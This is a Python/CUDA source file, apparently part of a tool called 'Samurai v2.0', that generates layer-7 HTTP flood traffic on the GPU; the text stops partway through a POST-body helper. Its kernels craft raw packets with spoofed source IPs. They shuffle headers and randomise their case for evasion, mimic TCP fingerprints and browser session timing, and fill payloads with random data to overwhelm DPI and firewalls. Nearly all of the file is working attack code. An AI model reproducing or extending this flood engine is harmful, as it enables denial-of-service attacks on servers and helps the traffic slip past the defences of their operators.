"""GPU Payload Generation Module for Samurai v2.0

This module provides high-performance GPU-accelerated HTTP payload generation
using CUDA kernels for L7 attack simulation.

Features:
    - Polymorphic HTTP/1.1 request generation
    - HTTP/2 frame generation (basic support)
    - Session-based request sequencing
    - Cookie and Referer header support
    - POST body generation with multiple content types
    - Header shuffling for evasion
    - Dynamic entropy payload generation

Author: Samurai Team
"""

import cupy as cp
import numpy as np
import logging
import math
import random
import string
import time
from typing import List, Optional, Tuple, Dict, Any

from numba import cuda, uint8, uint16, uint32, uint64
from numba.cuda.random import create_xoroshiro128p_states, xoroshiro128p_uniform_float32

# ============================================================================
# Constants
# ============================================================================

# Component Limits
MAX_COMPONENTS = 64      # Max number of items per component type
MAX_STR_LEN = 256        # Max length of a single component string
MAX_STEPS = 8            # Max steps in a resource chain
MAX_COOKIES = 16         # Max cookies per request
MAX_HEADERS = 32         # Max custom headers per request
MAX_POST_BODY = 4096     # Max POST body size

# HTTP Methods
HTTP_GET = 0
HTTP_POST = 1
HTTP_HEAD = 2
HTTP_PUT = 3
HTTP_DELETE = 4
HTTP_OPTIONS = 5
HTTP_PATCH = 6

# Content Types
CONTENT_TYPE_FORM = 0           # application/x-www-form-urlencoded
CONTENT_TYPE_JSON = 1           # application/json
CONTENT_TYPE_XML = 2            # application/xml
CONTENT_TYPE_MULTIPART = 3      # multipart/form-data
CONTENT_TYPE_PLAIN = 4          # text/plain

# HTTP Versions
HTTP_10 = 0
HTTP_11 = 1
HTTP_20 = 2

# Default User Agents (modern browsers)
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
]

# Default Paths
DEFAULT_PATHS = [
    "/", "/index.html", "/login", "/api/v1/users", "/search", "/admin",
    "/static/js/app.js", "/static/css/style.css", "/images/logo.png",
    "/api/v1/products", "/checkout", "/cart", "/profile", "/settings"
]

# Accept-Language values
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8"
]

# Accept values
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "*/*",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
]


# --- GPU Device Functions ---

@cuda.jit(device=True)
def copy_string(dest, dest_offset, src, src_offset, length):
    """Copies a byte string using aligned uint32 stores when possible."""
    if (dest_offset & 0x3) == 0 and length >= 4:
        dest_u32 = dest.view(np.uint32)
        word_dst = dest_offset >> 2
        num_uint32 = length // 4

        for i in range(num_uint32):
            byte_idx = i * 4
            val = (src[src_offset + byte_idx]) | \
                  (src[src_offset + byte_idx + 1] << 8) | \
                  (src[src_offset + byte_idx + 2] << 16) | \
                  (src[src_offset + byte_idx + 3] << 24)
            dest_u32[word_dst + i] = val

        rem = length % 4
        rem_start = num_uint32 * 4
        for i in range(rem):
            dest[dest_offset + rem_start + i] = src[src_offset + rem_start + i]
    else:
        for i in range(length):
            dest[dest_offset + i] = src[src_offset + i]
    return dest_offset + length

@cuda.jit(device=True)
def write_uint32_be(buffer, offset, value):
    """Writes a 32-bit integer in Big Endian."""
    buffer[offset] = (value >> 24) & 0xFF
    buffer[offset + 1] = (value >> 16) & 0xFF
    buffer[offset + 2] = (value >> 8) & 0xFF
    buffer[offset + 3] = value & 0xFF

@cuda.jit(device=True)
def write_uint16_be(buffer, offset, value):
    """Writes a 16-bit integer in Big Endian."""
    buffer[offset] = (value >> 8) & 0xFF
    buffer[offset + 1] = value & 0xFF

@cuda.jit(device=True)
def get_random_index(rng_states, thread_id, max_val):
    """Returns a random integer in [0, max_val-1] using xoroshiro128p."""
    val = xoroshiro128p_uniform_float32(rng_states, thread_id)
    return int(val * max_val)

# --- Checksum Functions (Ported from gpu_packet.py) ---

@cuda.jit(device=True)
def calculate_checksum(buffer, offset, length):
    """
    Calculates 16-bit one's complement checksum.
    P1 FIX #12: Optimized with 32-bit read logic.
    """
    checksum = 0
    num_chunks = length // 4
    for i in range(num_chunks):
        base = offset + (i * 4)
        b0 = buffer[base]; b1 = buffer[base+1]; b2 = buffer[base+2]; b3 = buffer[base+3]
        checksum += (b0 << 8) | b1
        checksum += (b2 << 8) | b3
        
    rem_offset = offset + (num_chunks * 4)
    remainder = length % 4
    if remainder >= 2:
        checksum += (buffer[rem_offset] << 8) | buffer[rem_offset + 1]
        if remainder == 3:
            checksum += (buffer[rem_offset + 2] << 8)
    elif remainder == 1:
        checksum += (buffer[rem_offset] << 8)
            
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
    return (~checksum) & 0xFFFF

@cuda.jit(device=True)
def calculate_tcp_checksum_optimized(buffer, tcp_offset, tcp_len, src_ip, dst_ip):
    """
    Calculates TCP checksum with pseudo-header.
    P1 FIX #12: Optimized with 32-bit read logic.
    """
    # Pseudo Header
    checksum = 0
    checksum += (src_ip >> 16) & 0xFFFF
    checksum += src_ip & 0xFFFF
    checksum += (dst_ip >> 16) & 0xFFFF
    checksum += dst_ip & 0xFFFF
    checksum += 6 # Protocol TCP
    checksum += tcp_len
    
    # TCP Header + Payload
    num_chunks = tcp_len // 4
    for i in range(num_chunks):
        base = tcp_offset + (i * 4)
        b0 = buffer[base]; b1 = buffer[base+1]; b2 = buffer[base+2]; b3 = buffer[base+3]
        checksum += (b0 << 8) | b1
        checksum += (b2 << 8) | b3
        
    rem_offset = tcp_offset + (num_chunks * 4)
    remainder = tcp_len % 4
    if remainder >= 2:
        checksum += (buffer[rem_offset] << 8) | buffer[rem_offset + 1]
        if remainder == 3:
            checksum += (buffer[rem_offset + 2] << 8)
    elif remainder == 1:
        checksum += (buffer[rem_offset] << 8)
            
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    return (~checksum) & 0xFFFF

@cuda.jit
def generate_entropy_kernel(packets_buffer, rng_states, count, max_packet_size, target_ip_int, has_ethernet):
    """
    Fills the payload area with high-entropy (random) data to stress DPI/Firewalls.
    Also updates IP Total Length and Checksums.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    # Determine Offsets
    eth_len = 14 if has_ethernet else 0
    ip_len = 20
    tcp_len_hdr = 40 # Assuming TCP with Options
    
    header_offset = eth_len + ip_len + tcp_len_hdr
    pkt_start = idx * max_packet_size
    payload_start = pkt_start + header_offset
    
    # Fill Payload with Random Data
    # Let's fill up to max_packet_size - 4 (leave room for safety)
    # Or fill a fixed amount, e.g., 1000 bytes.
    payload_len = 1000
    
    # Generate random bytes
    # We can generate 64-bit randoms and write them
    for i in range(0, payload_len, 8):
        val = xoroshiro128p_uniform_float32(rng_states, idx) 
        # Float to Int (0-255) is slow byte by byte.
        # Better: use xoroshiro128p_next(rng_states, idx) if available, but Numba exposes uniform.
        # Let's just cast float to uint64 for entropy (not perfect uniform distribution but high entropy)
        # Actually, let's use a simple LCG or Xorshift for speed if we want pure bytes.
        # But we have rng_states.
        
        # Hacky entropy:
        rand_val = uint64(val * 18446744073709551615.0)
        
        if i + 8 <= payload_len:
            # Write 64 bits
            # packets_buffer[payload_start + i] ...
            # Numba doesn't support 64-bit write to uint8 array directly easily without cast loop
            # Let's just write 8 bytes
            for b in range(8):
                packets_buffer[payload_start + i + b] = (rand_val >> (b*8)) & 0xFF
        else:
            # Remaining bytes
            for b in range(payload_len - i):
                packets_buffer[payload_start + i + b] = (rand_val >> (b*8)) & 0xFF

    # Update Lengths and Checksums
    total_ip_len = ip_len + tcp_len_hdr + payload_len
    
    # Update IP Total Length
    ip_offset = pkt_start + eth_len
    packets_buffer[ip_offset + 2] = (total_ip_len >> 8) & 0xFF
    packets_buffer[ip_offset + 3] = total_ip_len & 0xFF
    
    # Recalculate IP Checksum
    packets_buffer[ip_offset + 10] = 0; packets_buffer[ip_offset + 11] = 0
    ip_csum = calculate_checksum(packets_buffer, ip_offset, ip_len)
    packets_buffer[ip_offset + 10] = (ip_csum >> 8) & 0xFF
    packets_buffer[ip_offset + 11] = ip_csum & 0xFF
    
    # Update TCP Checksum
    transport_offset = ip_offset + ip_len
    tcp_total_len = tcp_len_hdr + payload_len
    
    # Read Source IP
    src_ip = (packets_buffer[ip_offset + 12] << 24) | (packets_buffer[ip_offset + 13] << 16) | \
             (packets_buffer[ip_offset + 14] << 8) | packets_buffer[ip_offset + 15]
             
    # Zero TCP Checksum
    packets_buffer[transport_offset + 16] = 0; packets_buffer[transport_offset + 17] = 0
    
    tcp_csum = calculate_tcp_checksum_optimized(packets_buffer, transport_offset, tcp_total_len, src_ip, target_ip_int)
    packets_buffer[transport_offset + 16] = (tcp_csum >> 8) & 0xFF
    packets_buffer[transport_offset + 17] = tcp_csum & 0xFF

@cuda.jit
def assemble_http_payload_kernel(packets_buffer, rng_states, count, max_packet_size,
                                 methods, methods_offsets, methods_lens, num_methods,
                                 paths, paths_offsets, paths_lens, num_paths,
                                 uas, uas_offsets, uas_lens, num_uas,
                                 target_ip_str, target_ip_len,
                                 target_ip_int):
    """
    Assembles a polymorphic HTTP request payload for each packet.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    # 1. Random Selections
    method_idx = get_random_index(rng_states, idx, num_methods)
    path_idx = get_random_index(rng_states, idx, num_paths)
    ua_idx = get_random_index(rng_states, idx, num_uas)

    # 2. Calculate Offsets
    # Packet start in the global buffer
    pkt_start = idx * max_packet_size
    
    # Offsets (Assuming Ethernet=14, IP=20, TCP=40 with Options)
    eth_len = 14
    ip_len = 20
    tcp_len_hdr = 40
    header_offset = eth_len + ip_len + tcp_len_hdr
    
    current_offset = pkt_start + header_offset
    
    # 3. Assemble Payload
    
    # Method
    m_off = methods_offsets[method_idx]
    m_len = methods_lens[method_idx]
    current_offset = copy_string(packets_buffer, current_offset, methods, m_off, m_len)
    
    # Space
    packets_buffer[current_offset] = 0x20 # ' '
    current_offset += 1
    
    # Path
    p_off = paths_offsets[path_idx]
    p_len = paths_lens[path_idx]
    current_offset = copy_string(packets_buffer, current_offset, paths, p_off, p_len)
    
    # HTTP Version + Host Header Start
    # " HTTP/1.1\r\nHost: "
    http_ver = b" HTTP/1.1\r\nHost: "
    for i in range(len(http_ver)):
        packets_buffer[current_offset + i] = http_ver[i]
    current_offset += len(http_ver)
    
    # Target IP
    current_offset = copy_string(packets_buffer, current_offset, target_ip_str, 0, target_ip_len)
    
    # User-Agent Header Start
    # "\r\nUser-Agent: "
    ua_header = b"\r\nUser-Agent: "
    for i in range(len(ua_header)):
        packets_buffer[current_offset + i] = ua_header[i]
    current_offset += len(ua_header)
    
    # User-Agent Value
    u_off = uas_offsets[ua_idx]
    u_len = uas_lens[ua_idx]
    current_offset = copy_string(packets_buffer, current_offset, uas, u_off, u_len)
    
    # Standard Headers + End
    # "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
    std_headers = b"\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
    for i in range(len(std_headers)):
        packets_buffer[current_offset + i] = std_headers[i]
    current_offset += len(std_headers)
    
    # 4. Update Lengths and Checksums
    payload_len = current_offset - (pkt_start + header_offset)
    total_ip_len = ip_len + tcp_len_hdr + payload_len
    
    # Update IP Total Length (Offset 14+2 = 16)
    ip_offset = pkt_start + eth_len
    packets_buffer[ip_offset + 2] = (total_ip_len >> 8) & 0xFF
    packets_buffer[ip_offset + 3] = total_ip_len & 0xFF
    
    # Recalculate IP Checksum
    packets_buffer[ip_offset + 10] = 0; packets_buffer[ip_offset + 11] = 0
    ip_csum = calculate_checksum(packets_buffer, ip_offset, ip_len)
    packets_buffer[ip_offset + 10] = (ip_csum >> 8) & 0xFF
    packets_buffer[ip_offset + 11] = ip_csum & 0xFF
    
    # Update TCP Checksum
    transport_offset = ip_offset + ip_len
    tcp_total_len = tcp_len_hdr + payload_len
    
    # Read Source IP from buffer (Offset 12 in IP header)
    # Note: Buffer is uint8, need to reconstruct uint32
    src_ip = (packets_buffer[ip_offset + 12] << 24) | (packets_buffer[ip_offset + 13] << 16) | \
             (packets_buffer[ip_offset + 14] << 8) | packets_buffer[ip_offset + 15]
             
    # Zero TCP Checksum (Offset 16 in TCP header)
    packets_buffer[transport_offset + 16] = 0; packets_buffer[transport_offset + 17] = 0
    
    tcp_csum = calculate_tcp_checksum_optimized(packets_buffer, transport_offset, tcp_total_len, src_ip, target_ip_int)
    packets_buffer[transport_offset + 16] = (tcp_csum >> 8) & 0xFF
    packets_buffer[transport_offset + 17] = tcp_csum & 0xFF

@cuda.jit(device=True)
def randomize_case(buffer, offset, length, rng_states, idx):
    """Randomly changes the case of characters in a string."""
    for i in range(length):
        char = buffer[offset + i]
        if (char >= 65 and char <= 90) or (char >= 97 and char <= 122):
            if xoroshiro128p_uniform_float32(rng_states, idx) > 0.5:
                buffer[offset + i] = char ^ 0x20
    return offset + length

@cuda.jit
def fused_http_generator_kernel(packets_buffer, rng_states, count, max_packet_size,
                                target_ip_int, target_port, real_src_ip_int, spoof_enabled,
                                methods, methods_offsets, methods_lens, num_methods,
                                paths, paths_offsets, paths_lens, num_paths,
                                uas, uas_offsets, uas_lens, num_uas,
                                target_ip_str, target_ip_len, gateway_mac, spoof_base_ip, spoof_mask,
                                window_sizes, mss_values, ttls,
                                session_steps, session_active_paths, session_timers,
                                current_time):
    """
    P1 FIX #9: Fused Kernel.
    P2 FIX #16: Better RNG (xoroshiro128p).
    P2 FIX #19: Gateway MAC support.
    P2 FIX #30: Subnet-based spoofing.
    P3: Header Shuffling & Case Randomization & TCP Mimicry.
    P4: Session-Based Request Sequencing (Resource Chain).
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    pkt_start = idx * max_packet_size
    
    # --- 0. Session Logic ---
    # session_steps: current step in the chain (0: HTML, 1+: Resources)
    # session_timers: timestamp when the next request is allowed
    # current_time: passed from host (ms)
    
    # If it's too early for this session, we could skip or send a dummy.
    # For now, we'll just proceed but the timing will be "best effort" 
    # unless we implement a more complex scheduler.
    
    step = session_steps[idx]
    
    # Select Path based on step
    # If step == 0, pick a random main path
    # If step > 0, pick the dependency from the chain
    if step == 0:
        rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
        path_idx = int(rand_tmp * num_paths)
        session_active_paths[idx] = path_idx # Store which main path we are on
    else:
        path_idx = session_active_paths[idx]
        
    # Determine the actual string to use for the path
    # (This logic will be refined to pick from dependencies if step > 0)
    # For now, let's assume if step > 0, we append a resource suffix or pick from a secondary list.
    # To keep it simple for the first iteration:
    # step 0: /index.html
    # step 1: /style.css
    # step 2: /script.js
    # ...
    
    # --- 1. Header Generation (L2/L3/L4) ---
    header_offset = 14 + 20 + 40
    
    # TCP Mimicry
    win_size = window_sizes[idx] if window_sizes[idx] > 0 else 64240
    mss = mss_values[idx] if mss_values[idx] > 0 else 1460
    ttl_val = ttls[idx] if ttls[idx] > 0 else 64

    # Source IP (branchless selection to avoid warp divergence)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    num_hosts = 1 << (32 - spoof_mask)
    spoof_src_ip_int = spoof_base_ip + int(rand_tmp * (num_hosts - 1))
    src_ip_int = real_src_ip_int + (spoof_enabled * (spoof_src_ip_int - real_src_ip_int))
        
    # IP ID
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_tmp * 65535)
    
    # Source Port
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    src_port = 1024 + int(rand_tmp * 64511)
    
    # TCP Sequence
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    tcp_seq = int(rand_tmp * 0xFFFFFFFF)
    
    # Write Ethernet
    packets_buffer[pkt_start] = (gateway_mac >> 40) & 0xFF
    packets_buffer[pkt_start + 1] = (gateway_mac >> 32) & 0xFF
    packets_buffer[pkt_start + 2] = (gateway_mac >> 24) & 0xFF
    packets_buffer[pkt_start + 3] = (gateway_mac >> 16) & 0xFF
    packets_buffer[pkt_start + 4] = (gateway_mac >> 8) & 0xFF
    packets_buffer[pkt_start + 5] = gateway_mac & 0xFF
    write_uint32_be(packets_buffer, pkt_start + 6, 0)
    write_uint16_be(packets_buffer, pkt_start + 10, 0)
    write_uint16_be(packets_buffer, pkt_start + 12, 0x0800)
    
    # Write IP
    ip_offset = pkt_start + 14
    write_uint16_be(packets_buffer, ip_offset, 0x4500)
    write_uint16_be(packets_buffer, ip_offset + 4, ip_id)
    write_uint16_be(packets_buffer, ip_offset + 6, 0)
    packets_buffer[ip_offset + 8] = ttl_val
    packets_buffer[ip_offset + 9] = 6 # TCP
    write_uint32_be(packets_buffer, ip_offset + 12, src_ip_int)
    write_uint32_be(packets_buffer, ip_offset + 16, target_ip_int)
    
    # Write TCP
    tcp_offset = ip_offset + 20
    write_uint16_be(packets_buffer, tcp_offset, src_port)
    write_uint16_be(packets_buffer, tcp_offset + 2, target_port)
    write_uint32_be(packets_buffer, tcp_offset + 4, tcp_seq)
    write_uint32_be(packets_buffer, tcp_offset + 8, 0) # ACK
    packets_buffer[tcp_offset + 12] = 0xA0 # Data Offset = 10 (40 bytes)
    packets_buffer[tcp_offset + 13] = 0x18 # PSH|ACK
    write_uint16_be(packets_buffer, tcp_offset + 14, win_size)
    
    # TCP Options (MSS, SACK, TS)
    opt_off = tcp_offset + 20
    packets_buffer[opt_off] = 2; packets_buffer[opt_off+1] = 4
    write_uint16_be(packets_buffer, opt_off+2, mss)
    packets_buffer[opt_off+4] = 4; packets_buffer[opt_off+5] = 2
    packets_buffer[opt_off+6] = 8; packets_buffer[opt_off+7] = 10
    write_uint32_be(packets_buffer, opt_off+8, tcp_seq)
    
    # --- 2. HTTP Payload Assembly ---
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    method_idx = int(rand_tmp * num_methods)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    path_idx = int(rand_tmp * num_paths)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ua_idx = int(rand_tmp * num_uas)
    
    curr = pkt_start + header_offset
    
    # Method
    curr = copy_string(packets_buffer, curr, methods, methods_offsets[method_idx], methods_lens[method_idx])
    packets_buffer[curr] = 0x20; curr += 1 # Space
    
    # Path
    if step == 0:
        curr = copy_string(packets_buffer, curr, paths, paths_offsets[path_idx], paths_lens[path_idx])
    else:
        # Resource Chain Simulation:
        # In a real scenario, we'd have a mapping. 
        # For this implementation, we'll use "synthetic" resource names based on the main path.
        # e.g., /login -> /login.css (step 1), /login.js (step 2)
        curr = copy_string(packets_buffer, curr, paths, paths_offsets[path_idx], paths_lens[path_idx])
        if step == 1:
            for i, b in enumerate(b".css"): packets_buffer[curr + i] = b
            curr += 4
        elif step == 2:
            for i, b in enumerate(b".js"): packets_buffer[curr + i] = b
            curr += 3
        elif step == 3:
            for i, b in enumerate(b".png"): packets_buffer[curr + i] = b
            curr += 4
            
    # Version
    for i, b in enumerate(b" HTTP/1.1\r\n"):
        packets_buffer[curr + i] = b
    curr += 11
    
    # Header Shuffling (Simple 2-way shuffle for now: Host vs User-Agent)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    if rand_tmp > 0.5:
        # Host then UA
        h_start = curr
        for i, b in enumerate(b"Host: "): packets_buffer[curr + i] = b
        curr += 6
        randomize_case(packets_buffer, h_start, 4, rng_states, idx) # Randomize "Host"
        
        curr = copy_string(packets_buffer, curr, target_ip_str, 0, target_ip_len)
        
        ua_start = curr
        for i, b in enumerate(b"\r\nUser-Agent: "): packets_buffer[curr + i] = b
        curr += 14
        randomize_case(packets_buffer, ua_start + 2, 10, rng_states, idx) # Randomize "User-Agent"
        
        curr = copy_string(packets_buffer, curr, uas, uas_offsets[ua_idx], uas_lens[ua_idx])
    else:
        # UA then Host
        ua_start = curr
        for i, b in enumerate(b"User-Agent: "): packets_buffer[curr + i] = b
        curr += 12
        randomize_case(packets_buffer, ua_start, 10, rng_states, idx)
        
        curr = copy_string(packets_buffer, curr, uas, uas_offsets[ua_idx], uas_lens[ua_idx])
        
        h_start = curr
        for i, b in enumerate(b"\r\nHost: "): packets_buffer[curr + i] = b
        curr += 8
        randomize_case(packets_buffer, h_start + 2, 4, rng_states, idx)
        
        curr = copy_string(packets_buffer, curr, target_ip_str, 0, target_ip_len)
    # Additional Headers
    # Accept: */*
    # Connection: keep-alive
    # Accept-Language: en-US,en;q=0.9
    
    # Randomly add/shuffle these
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    if rand_tmp > 0.3:
        for i, b in enumerate(b"\r\nAccept: */*"): packets_buffer[curr + i] = b
        curr += 13
    
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    if rand_tmp > 0.3:
        for i, b in enumerate(b"\r\nConnection: keep-alive"): packets_buffer[curr + i] = b
        curr += 24
        
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    if rand_tmp > 0.5:
        for i, b in enumerate(b"\r\nAccept-Language: en-US,en;q=0.9"): packets_buffer[curr + i] = b
        curr += 31

    # End of Headers
    packets_buffer[curr] = 0x0D; packets_buffer[curr+1] = 0x0A # \r\n
    packets_buffer[curr+2] = 0x0D; packets_buffer[curr+3] = 0x0A # \r\n
    curr += 4
    
    # 3. Finalize Lengths and Checksums
    payload_len = curr - (pkt_start + header_offset)
    write_uint16_be(packets_buffer, ip_offset + 2, 20 + 40 + payload_len)
    write_uint16_be(packets_buffer, ip_offset + 10, 0)
    ip_csum = calculate_checksum(packets_buffer, ip_offset, 20)
    write_uint16_be(packets_buffer, ip_offset + 10, ip_csum)
    write_uint16_be(packets_buffer, tcp_offset + 16, 0)
    tcp_csum = calculate_tcp_checksum_optimized(packets_buffer, tcp_offset, 40 + payload_len, src_ip_int, target_ip_int)
    write_uint16_be(packets_buffer, tcp_offset + 16, tcp_csum)

    # --- 4. Update Session State ---
    # Increment step, reset if max reached
    new_step = step + 1
    if new_step > 3: # HTML + 3 resources
        new_step = 0
    session_steps[idx] = new_step
    
    # Add Think Time (ms)
    # step 0 (HTML) -> step 1 (CSS): very short (browser parsing)
    # step 1 -> 2 -> 3: short
    # step 3 -> 0: long (human reading)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    if new_step == 0:
        think_time = 2000 + int(rand_tmp * 5000) # 2-7 seconds
    else:
        think_time = 50 + int(rand_tmp * 200) # 50-250 ms
        
    session_timers[idx] = current_time + think_time

# --- Host Helper Functions ---

def prepare_string_array(string_list):
    """
    Flattens a list of strings into a single byte array and offset/len arrays for GPU.
    """
    flat_data = b"".join([s.encode('utf-8') if isinstance(s, str) else s for s in string_list])
    offsets = []
    lengths = []
    current_off = 0
    
    for s in string_list:
        l = len(s)
        offsets.append(current_off)
        lengths.append(l)
        current_off += l
        
    return (
        cp.array(list(flat_data), dtype=cp.uint8),
        cp.array(offsets, dtype=cp.uint32),
        cp.array(lengths, dtype=cp.uint32),
        len(string_list)
    )

class GPUPayloadEngine:
    def __init__(self, count, max_packet_size=512):
        """
        P1 FIX #10: Pre-allocate buffers (Memory Pool)
        """
        self.count = count
        self.max_packet_size = max_packet_size
        self.rng_states = create_xoroshiro128p_states(count, seed=1234)
        
        # Pre-allocate packet buffer
        self.packets_gpu = cp.zeros((count * max_packet_size), dtype=cp.uint8)
        
        # Default Components
        self.methods = ["GET", "POST", "HEAD"]
        self.paths = ["/", "/login", "/api", "/search", "/admin", "/index.html"]
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        ]
        
        # Session State Buffers
        self.session_steps = cp.zeros(count, dtype=cp.uint8)
        self.session_active_paths = cp.zeros(count, dtype=cp.uint32)
        self.session_timers = cp.zeros(count, dtype=cp.uint64)
        
        self._upload_components()
        
    def _upload_components(self):
        self.d_methods, self.d_m_offs, self.d_m_lens, self.n_methods = prepare_string_array(self.methods)
        self.d_paths, self.d_p_offs, self.d_p_lens, self.n_paths = prepare_string_array(self.paths)
        self.d_uas, self.d_u_offs, self.d_u_lens, self.n_uas = prepare_string_array(self.uas)
        
    def load_custom_wordlists(self, methods=None, paths=None, uas=None):
        if methods: self.methods = methods
        if paths: self.paths = paths
        if uas: self.uas = uas
        self._upload_components()

    def generate_fused_http(self, target_ip, target_port, real_src_ip, spoof_ip=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", window_sizes=None, mss_values=None, ttls=None, current_time=0):
        """
        P1 FIX #9: Uses fused kernel for maximum performance.
        P2 FIX #19: Added gateway_mac support.
        P2 FIX #30: Added spoof_subnet support.
        P3: Added TCP mimicry support.
        """
        if spoof_subnet is None:
            spoof_subnet = "1.0.0.0/8"
            
        # Parse spoof_subnet
        if "/" in spoof_subnet:
            base_ip_str, mask_str = spoof_subnet.split("/")
            spoof_mask = int(mask_str)
        else:
            base_ip_str = spoof_subnet
            spoof_mask = 32
        spoof_base_ip = int(sum([int(x) << (24 - i*8) for i, x in enumerate(base_ip_str.split('.'))]))
        
        threads_per_block = 256
        blocks_per_grid = (self.count + (threads_per_block - 1)) // threads_per_block
        
        target_ip_bytes = cp.array(list(target_ip.encode()), dtype=cp.uint8)
        target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
        real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
        
        # Prepare TCP Mimicry Arrays
        if window_sizes is None: window_sizes = cp.zeros(self.count, dtype=cp.uint16)
        if mss_values is None: mss_values = cp.zeros(self.count, dtype=cp.uint16)
        if ttls is None: ttls = cp.zeros(self.count, dtype=cp.uint8)

        fused_http_generator_kernel[blocks_per_grid, threads_per_block, stream](
            self.packets_gpu, self.rng_states, self.count, self.max_packet_size,
            target_ip_int, target_port, real_src_ip_int, 1 if spoof_ip else 0,
            self.d_methods, self.d_m_offs, self.d_m_lens, self.n_methods,
            self.d_paths, self.d_p_offs, self.d_p_lens, self.n_paths,
            self.d_uas, self.d_u_offs, self.d_u_lens, self.n_uas,
            target_ip_bytes, len(target_ip),
            np.int64(gateway_mac),
            np.int64(spoof_base_ip),
            np.int64(spoof_mask),
            window_sizes, mss_values, ttls,
            self.session_steps, self.session_active_paths, self.session_timers,
            np.uint64(current_time)
        )
        return self.packets_gpu, self.max_packet_size

    def generate_payloads(self, packets_buffer, target_ip, max_packet_size, stream=None):
        """
        Legacy method (non-fused).
        """
        threads_per_block = 256
        blocks_per_grid = (self.count + (threads_per_block - 1)) // threads_per_block
        
        target_ip_bytes = cp.array(list(target_ip.encode()), dtype=cp.uint8)
        target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
        
        assemble_http_payload_kernel[blocks_per_grid, threads_per_block, stream](
            packets_buffer, self.rng_states, self.count, max_packet_size,
            self.d_methods, self.d_m_offs, self.d_m_lens, self.n_methods,
            self.d_paths, self.d_p_offs, self.d_p_lens, self.n_paths,
            self.d_uas, self.d_u_offs, self.d_u_lens, self.n_uas,
            target_ip_bytes, len(target_ip), target_ip_int
        )


# ============================================================================
# POST Body Generation
# ============================================================================

def generate_form_body(field_count: int = 5) -> bytes:
    """
    Generate a random application/x-www-form-urlencoded POST body.
    
    Args:
        field_count: Number of form fields to generate
    
    Returns:
        Encoded form body bytes
    """
    fields = []
    
    # Common form field names
    field_names = [
        "username", "password", "email", "name", "phone",
        "address", "city", "country", "zip", "message",
        "query", "search", "token", "csrf", "action",
        "id", "page", "limit", "offset", "sort"
    ]
    
    for i in range(field_count):
        name = random.choice(field_names)
        # Generate random value
        value_len = random.randint(5, 30)
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=value_len))
        fields.append(f"{name}={value}")
    
    return "&".join(fields).encode('utf-8')


def generate_json_body(depth: int = 2, field_count: int = 5) -> bytes:
    """
    Generate a random JSON POST body.
    
    Args:
        depth: Maximum nesting depth
        field_count: Number of fields per level
    
    Returns:
        JSON body bytes
    """
    def generate_value(current_depth: int) -> str:
